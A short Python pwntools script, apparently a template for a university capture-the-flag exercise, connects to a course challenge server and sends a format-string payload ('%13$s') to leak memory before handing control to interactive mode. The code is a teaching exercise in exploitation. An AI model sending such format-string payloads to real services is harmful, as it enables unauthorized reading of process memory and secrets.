#!/usr/bin/python3
# pwntools is a very powerful library for doing exploitation
from pwn import *

# TODO: Update with actual values
HOST = "cs2107-ctfd-i.comp.nus.edu.sg"
PORT = 2779

for i in range (13,14):
    r = remote(HOST, PORT)  # to open a connection to the remote service, aka the challenge
#pause()

# TODO: Fill in your payload
    PADDING = "%"+str(i)+"$s"
    r.sendline(PADDING)
    r.interactive()

# earlier, the script helps us send/receive data to/from the service
# with interactive, we can directly interact with the service
